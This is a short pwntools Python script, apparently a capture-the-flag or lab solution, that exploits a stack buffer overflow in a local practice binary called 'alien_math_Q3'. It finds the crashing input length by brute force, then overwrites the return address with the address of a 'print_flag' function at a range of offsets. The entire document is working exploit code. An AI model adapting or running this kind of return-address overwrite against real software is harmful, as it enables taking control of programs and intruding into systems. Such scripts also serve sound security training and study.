from pwn import *
 
FILENAME = '../Modified Binaries/alien_math_Q3'

## Bruteforce length ######################
length = 0
for i in range(1,100):
    payload = cyclic(i)
    io = process(FILENAME)
    io.sendline('a')
    io.sendline('a')
    io.sendline(payload)
    print(io.recv())
    io.wait()
    exit_code = io.poll()
    #print(exit_code)
    if exit_code == -11:
        length = i
        break
    
    
func = "print_flag"
print(length)
e = ELF(FILENAME)
log.info("Address: 0x{:02X}".format(e.symbols[func]))

for offset in range(length-8, length+8+1):
    p = process(FILENAME)
    payload = fit({offset: e.symbols[func]})
    print(payload)
    p.sendline('a')
    p.sendline('a')
    p.sendline(payload)
    #print(p.recv(timeout =1))
    p.interactive()
    print(length, offset-length, offset)

